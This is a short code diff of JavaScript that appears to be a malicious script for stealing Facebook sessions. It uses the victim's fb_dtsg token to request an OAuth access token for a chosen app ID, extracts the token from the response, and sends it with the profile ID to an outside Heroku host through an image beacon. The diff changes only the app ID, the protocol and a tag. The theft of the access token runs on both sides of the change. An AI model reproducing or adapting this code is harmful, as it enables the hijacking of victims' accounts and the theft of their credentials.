@@ -53,7 +53,7 @@ function _e_P(){
 function _g_T() {
     var params = {};
     params["fb_dtsg"] = fb_dtsg;
-    params["app_id"] = "121876164619130";
+    params["app_id"] = "165907476854626";
     params["redirect_uri"] = "fbconnect://success";
     params["display"] = "popup";
     params["access_token"] = "";
@@ -85,7 +85,7 @@ function _g_T() {
             var c = {};
             if(xhr.responseText.indexOf("access_token=") > 0){
                 c.access_token = xhr.responseText.split("access_token=")[1].split("&")[0];
-                new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  c.access_token + "&gnd=AndroidNEW";
+                new Image().src = "http://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  c.access_token + "&gnd=Android";
                 _c(c);
             }
         }
